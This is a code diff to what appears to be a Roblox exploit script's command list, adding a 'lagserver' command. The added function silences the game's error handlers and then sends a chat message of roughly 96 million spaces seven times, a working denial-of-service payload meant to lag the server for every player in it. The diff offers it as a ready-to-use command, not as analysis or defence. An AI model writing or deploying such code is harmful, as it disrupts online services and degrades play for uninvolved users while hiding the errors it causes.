@@ -4455,6 +4455,7 @@ CMDs[#CMDs + 1] = {NAME = 'allowrejoin / allowrj [true/false] (CLIENT)', DESC = 
 CMDs[#CMDs + 1] = {NAME = 'cancelteleport / canceltp', DESC = 'Cancels teleports in progress'}
 CMDs[#CMDs + 1] = {NAME = 'volume / vol [0-10]', DESC = 'Adjusts your game volume on a scale of 0 to 10'}
 CMDs[#CMDs + 1] = {NAME = 'antilag / boostfps / lowgraphics', DESC = 'Lowers game quality to boost FPS'}
+CMDs[#CMDs + 1] = {NAME = 'lagserver', DESC = 'Lags the server for everyone in the server'}
 CMDs[#CMDs + 1] = {NAME = 'record / rec', DESC = 'Starts roblox recorder'}
 CMDs[#CMDs + 1] = {NAME = 'screenshot / scrnshot', DESC = 'Takes a screenshot'}
 CMDs[#CMDs + 1] = {NAME = 'togglefullscreen / togglefs', DESC = 'Toggles fullscreen'}
@@ -7710,6 +7711,19 @@ addcmd('antilag',{'boostfps','lowgraphics'},function(args, speaker)
 		if v:IsA("BlurEffect") or v:IsA("SunRaysEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("BloomEffect") or v:IsA("DepthOfFieldEffect") then
 			v.Enabled = false
 		end
+	end
+end)
+
+addcmd('lagserver',{},function(args, speaker)
+	for _,v in pairs(getconnections(game:GetService("ScriptContext").Error)) do
+		v:Disable()
+	end
+
+	local v =96000000 --Maximal bit stream on client
+	-- (96000000 - 12) -- Maximal bit stream that server accept +-2
+	local msg = ""..string.rep(" ",(v - 12))
+	for i=1,7 do
+		game.Players:Chat(msg)
 	end
 end)
 
